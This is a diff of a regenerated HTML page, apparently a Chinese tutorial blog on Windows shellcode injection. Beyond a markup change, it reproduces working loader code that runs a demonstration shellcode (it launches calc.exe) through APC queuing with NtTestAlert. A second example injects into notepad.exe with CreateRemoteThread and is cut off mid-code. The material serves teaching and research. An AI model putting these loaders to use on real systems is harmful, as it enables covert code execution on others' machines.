@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.92.0" /><meta name="theme-color" content="#16171d" />
+    <meta name="generator" content="Hugo 0.94.2" /><meta name="theme-color" content="#16171d" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.883a355335df5c9f19d469cd25bb68215497fd354fb3a8699eaf851799c161a8.js"></script>
+        <script src="/js/meme.min.aa6eafedce46ed74b4ce8a5ccd665b53678dd707d3ba5339679e4b4dda556062.js"></script>
 
     
 
@@ -287,12 +287,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">DWORD</span> <span class="nf">QueueUserAPC</span><span class="p">(</span>
-  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">PAPCFUNC</span>  <span class="n">pfnAPC</span><span class="p">,</span> <span class="c1">//APC 函数地址
-</span><span class="c1"></span>  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HANDLE</span>    <span class="n">hThread</span><span class="p">,</span> <span class="o">//</span><span class="err">线程句柄</span><span class="p">(</span><span class="err">可以跨进程</span><span class="p">)</span>
-  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">ULONG_PTR</span> <span class="n">dwData</span>  <span class="c1">//APC 函数的参数
-</span><span class="c1"></span><span class="p">);</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">DWORD</span> <span class="nf">QueueUserAPC</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">PAPCFUNC</span>  <span class="n">pfnAPC</span><span class="p">,</span> <span class="c1">//APC 函数地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HANDLE</span>    <span class="n">hThread</span><span class="p">,</span> <span class="o">//</span><span class="err">线程句柄</span><span class="p">(</span><span class="err">可以跨进程</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">ULONG_PTR</span> <span class="n">dwData</span>  <span class="c1">//APC 函数的参数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">);</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="apc-注入"><a href="#apc-注入" class="anchor-link">#</a><a href="#contents:apc-注入" class="headings">APC 注入</a></h3>
 <p>如上所述，可知道主动运行APC 队列有两种方式: 一是可通过创建一个suspend状态的线程，将shellcode地址插入该线程的APC 队列，再唤起该线程，此时APC 队列就会执行。二是通过NtTestAlert来主动执行APC 队列。</p>
@@ -344,49 +344,49 @@
 </span><span class="lnt">42
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
-</span><span class="cp"></span>
-<span class="c1">//定义NtTestAlert的函数指针
-</span><span class="c1"></span><span class="k">typedef</span> <span class="nf">VOID</span><span class="p">(</span><span class="n">NTAPI</span><span class="o">*</span> <span class="n">pNtTestAlert</span><span class="p">)(</span><span class="n">VOID</span><span class="p">);</span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
-		<span class="s">&#34;</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x63\x2e\x65\x78\x65\x00</span><span class="s">&#34;</span><span class="p">;</span>
-
-			<span class="c1">//获取ntdll.dll地址
-</span><span class="c1"></span>			<span class="n">pNtTestAlert</span> <span class="n">NtTestAlert</span> <span class="o">=</span> <span class="p">(</span><span class="n">pNtTestAlert</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">&#34;ntdll.dll&#34;</span><span class="p">),</span> <span class="s">&#34;NtTestAlert&#34;</span><span class="p">);</span>
-			<span class="c1">//分配可执行内存空间
-</span><span class="c1"></span>			<span class="n">LPVOID</span> <span class="n">lpBaseAddress</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
-			<span class="n">memcpy</span><span class="p">(</span><span class="n">lpBaseAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
-			<span class="c1">//((void(*)())lpBaseAddress)();
-</span><span class="c1"></span>			<span class="c1">//方法一
-</span><span class="c1"></span>			<span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">lpBaseAddress</span><span class="p">,</span> <span class="n">GetCurrentThread</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">);</span>
-			<span class="n">NtTestAlert</span><span class="p">();</span>
-			<span class="c1">//方法二
-</span><span class="c1"></span>			<span class="cm">/*HANDLE  hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)0xfff, 0, CREATE_SUSPENDED, NULL);
-</span><span class="cm">			QueueUserAPC((PAPCFUNC)lpBaseAddress, hThread, NULL);
-</span><span class="cm">			ResumeThread(hThread);
-</span><span class="cm">			WaitForSingleObject(hThread,INFINITE);*/</span>
-
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">//定义NtTestAlert的函数指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">typedef</span> <span class="nf">VOID</span><span class="p">(</span><span class="n">NTAPI</span><span class="o">*</span> <span class="n">pNtTestAlert</span><span class="p">)(</span><span class="n">VOID</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x63\x2e\x65\x78\x65\x00</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="c1">//获取ntdll.dll地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="n">pNtTestAlert</span> <span class="n">NtTestAlert</span> <span class="o">=</span> <span class="p">(</span><span class="n">pNtTestAlert</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">&#34;ntdll.dll&#34;</span><span class="p">),</span> <span class="s">&#34;NtTestAlert&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="c1">//分配可执行内存空间
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="n">LPVOID</span> <span class="n">lpBaseAddress</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="n">memcpy</span><span class="p">(</span><span class="n">lpBaseAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">			<span class="c1">//((void(*)())lpBaseAddress)();
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="c1">//方法一
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">lpBaseAddress</span><span class="p">,</span> <span class="n">GetCurrentThread</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="n">NtTestAlert</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="c1">//方法二
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="cm">/*HANDLE  hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)0xfff, 0, CREATE_SUSPENDED, NULL);
+</span></span></span><span class="line"><span class="cl"><span class="cm">			QueueUserAPC((PAPCFUNC)lpBaseAddress, hThread, NULL);
+</span></span></span><span class="line"><span class="cl"><span class="cm">			ResumeThread(hThread);
+</span></span></span><span class="line"><span class="cl"><span class="cm">			WaitForSingleObject(hThread,INFINITE);*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="函数指针与指针函数"><a href="#函数指针与指针函数" class="anchor-link">#</a><a href="#contents:函数指针与指针函数" class="headings">函数指针与指针函数</a></h3>
 <ol>
@@ -420,16 +420,16 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">func1</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>        <span class="c1">//定义一个函数，以方便下面定义函数指针
-</span><span class="c1"></span><span class="p">{</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;test for function pointer.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-<span class="p">}</span>
- 
-<span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">pFunc</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span>    <span class="c1">//函数指针定义
-</span><span class="c1"></span><span class="n">pFunc</span> <span class="o">=</span> <span class="n">func1</span><span class="p">;</span> 	        <span class="c1">//函数指针赋值
-</span><span class="c1"></span><span class="p">(</span><span class="o">*</span><span class="n">pFunc</span><span class="p">)();</span>             <span class="c1">//函数指针调用；用函数指针来调用以调用该函数，注意*pFunc要用（）括起来
-</span><span class="c1">//pFunc();              //调用的第二种写法，效果和上面一样
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">func1</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>        <span class="c1">//定义一个函数，以方便下面定义函数指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;test for function pointer.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">pFunc</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span>    <span class="c1">//函数指针定义
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">pFunc</span> <span class="o">=</span> <span class="n">func1</span><span class="p">;</span> 	        <span class="c1">//函数指针赋值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">(</span><span class="o">*</span><span class="n">pFunc</span><span class="p">)();</span>             <span class="c1">//函数指针调用；用函数指针来调用以调用该函数，注意*pFunc要用（）括起来
+</span></span></span><span class="line"><span class="cl"><span class="c1">//pFunc();              //调用的第二种写法，效果和上面一样
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><strong>而指针函数实质是一个函数</strong>，叫这个名字是因为他的返回类型是某一类型的指针。</p>
 <h2 id="理解-void---lpbaseaddress"><a href="#理解-void---lpbaseaddress" class="anchor-link">#</a><a href="#contents:理解-void---lpbaseaddress" class="headings">理解 <code>(*(void (* )()) lpBaseAddress)()</code></a></h2>
@@ -454,16 +454,16 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">HANDLE</span> <span class="nf">CreateRemoteThread</span><span class="p">(</span>
-  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">HANDLE</span>                 <span class="n">hProcess</span><span class="p">,</span>
-  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPSECURITY_ATTRIBUTES</span>  <span class="n">lpThreadAttributes</span><span class="p">,</span>
-  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">SIZE_T</span>                 <span class="n">dwStackSize</span><span class="p">,</span>
-  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPTHREAD_START_ROUTINE</span> <span class="n">lpStartAddress</span><span class="p">,</span>
-  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPVOID</span>                 <span class="n">lpParameter</span><span class="p">,</span>
-  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">DWORD</span>                  <span class="n">dwCreationFlags</span><span class="p">,</span>
-  <span class="p">[</span><span class="n">out</span><span class="p">]</span> <span class="n">LPDWORD</span>                <span class="n">lpThreadId</span>
-<span class="p">);</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">HANDLE</span> <span class="nf">CreateRemoteThread</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">HANDLE</span>                 <span class="n">hProcess</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPSECURITY_ATTRIBUTES</span>  <span class="n">lpThreadAttributes</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">SIZE_T</span>                 <span class="n">dwStackSize</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPTHREAD_START_ROUTINE</span> <span class="n">lpStartAddress</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPVOID</span>                 <span class="n">lpParameter</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">DWORD</span>                  <span class="n">dwCreationFlags</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">out</span><span class="p">]</span> <span class="n">LPDWORD</span>                <span class="n">lpThreadId</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>注入方式很简单: 打开远程进程句柄（PROCESS_ALL_ACCESS）—在目标进程里分配内存空间—将shellcode 写入到远程地址空间中—给CreateRemoteThread传入shellcode地址，启动线程。</p>
 <p>实现代码</p>
@@ -533,69 +533,69 @@
 </span><span class="lnt">62
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;Tlhelp32.h&gt;</span><span class="cp">
-</span><span class="cp"></span><span class="n">DWORD</span> <span class="nf">GetProcessIdByName</span><span class="p">(</span><span class="n">LPCTSTR</span> <span class="n">lpszProcessName</span><span class="p">)</span>
-<span class="p">{</span>
-	<span class="n">HANDLE</span> <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-	<span class="k">if</span> <span class="p">(</span><span class="n">hSnapshot</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
-	<span class="p">{</span>
-		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="p">}</span>
-	<span class="n">PROCESSENTRY32</span> <span class="n">pe</span><span class="p">;</span>
-	<span class="n">pe</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="n">pe</span><span class="p">;</span>
-	<span class="k">if</span> <span class="p">(</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">))</span>
-	<span class="p">{</span>
-		<span class="k">do</span> <span class="p">{</span>
-			<span class="k">if</span> <span class="p">(</span><span class="n">lstrcmpi</span><span class="p">(</span><span class="n">lpszProcessName</span><span class="p">,</span> <span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
-			<span class="p">{</span>
-				<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
-				<span class="k">return</span> <span class="n">pe</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
-			<span class="p">}</span>
-		<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">));</span>
-	<span class="p">}</span>
-	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
-	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
-		<span class="s">&#34;</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x63\x2e\x65\x78\x65\x00</span><span class="s">&#34;</span><span class="p">;</span>
-
-	<span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="n">GetProcessIdByName</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;notepad.exe&#34;</span><span class="p">));</span>
-	<span class="n">LPVOID</span> <span class="n">lpBaseAddress</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">2</span><span class="o">*</span><span class="mi">4096</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
-	<span class="c1">//注入shellcode 
